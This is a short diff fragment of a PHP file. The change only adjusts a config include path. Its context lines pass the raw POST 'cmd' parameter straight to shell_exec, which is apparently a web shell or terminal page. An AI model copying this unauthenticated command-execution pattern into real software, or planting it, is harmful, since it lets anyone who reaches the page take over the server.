@@ -1,5 +1,5 @@
 <?php
-require("config.php");
+require("../config.php");
 if(isset($_POST['cmd'])){
 	$resp = shell_exec($_POST['cmd']);
 	$terminal = $_POST['t'].'
